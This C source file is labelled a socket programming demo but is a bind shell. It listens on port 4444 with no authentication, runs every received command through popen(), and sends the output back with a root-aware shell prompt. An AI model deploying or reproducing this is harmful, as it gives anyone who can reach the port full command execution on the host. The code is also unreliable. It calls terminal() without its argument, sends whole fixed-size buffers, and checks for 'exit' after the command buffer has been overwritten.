// Server side C program to demonstrate Socket
// programming
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pwd.h>

#define MAX_CMD_LENGTH 1024
#define PORT 4444
#define VERBOSE 0

char *get_suffix(struct passwd *pw)
{
    static char suffix[3] = "$ "; 
    if (strncmp(pw->pw_name, "root", 4) == 0)
    {
        snprintf(suffix, sizeof(suffix), "# ");
    }
    return suffix;
}

char* terminal(struct passwd *pw)
{
    if (!pw) {
        return NULL;
    }
    char *suffix = get_suffix(pw);
    static char prompt[256];  
    char hostname[128];  
    gethostname(hostname, sizeof(hostname));
    // Construct the prompt using snprintf
    snprintf(prompt, sizeof(prompt), "%s@%s%s", pw->pw_name, hostname, suffix);
    return prompt;
}



int main(int argc, char const* argv[])
{
    //defining useful variables here
    struct passwd *pw = getpwuid(getuid());
    int server_fd, new_socket;
    ssize_t valread;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    char command[MAX_CMD_LENGTH];
    // defining the server file descriptor
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET,SO_REUSEADDR | SO_REUSEPORT, &opt,sizeof(opt));
    // setting the ip address and port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    // Forcefully attaching socket to the port
    bind(server_fd, (struct sockaddr*)&address,sizeof(address));
    if (listen(server_fd, 3) < 0) 
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    new_socket=accept(server_fd, (struct sockaddr*)&address,&addrlen);
    // start of the "terminal" as a while loop
    while(1){
        if(VERBOSE)
            {send(new_socket,terminal(),strlen(terminal()),0);}
        else
            {send(new_socket,get_suffix(pw),strlen(get_suffix(pw)),0);}
        
        memset(command, 0, MAX_CMD_LENGTH);
        valread = read(new_socket, command,MAX_CMD_LENGTH-1); // subtract 1 for the null  // terminator at the end
        command[valread] = '\0';
        // execute the command and capture the output
        printf("%s",command);
        FILE *fp;
        fp = popen(command, "r");
        while (fgets(command, sizeof(command), fp) != NULL) {
            send(new_socket,command,MAX_CMD_LENGTH,0);
        }
        
        //check for an exit command
        if (strncmp(command,"exit",4)==0)
        {
            printf("%s","exitting the shell");
            close(new_socket); // Close client connection
            close(server_fd); 
        break;
    }
    
}
    return 0;
}
